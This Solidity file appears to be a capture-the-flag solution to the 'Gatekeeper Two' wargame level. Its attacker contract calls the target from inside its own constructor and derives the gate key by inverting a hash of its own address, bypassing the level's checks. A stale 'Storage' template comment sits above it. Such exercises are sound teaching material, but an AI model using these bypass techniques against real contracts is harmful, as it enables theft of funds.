// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.8.2 <0.9.0;

/**
 * @title Storage
 * @dev Store & retrieve value in a variable
 * @custom:dev-run-script ./scripts/deploy_with_ethers.ts
 */

interface GatekeeperTwoI {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract AttackerGatekeeperTwo {
    GatekeeperTwoI gatekeeperTwo;

    constructor(address _gatekeeperTwo) {
        gatekeeperTwo = GatekeeperTwoI(_gatekeeperTwo);
        bytes8 gatekey = ~bytes8(keccak256(abi.encodePacked(address(this))));
        gatekeeperTwo.enter(gatekey);
    }
}
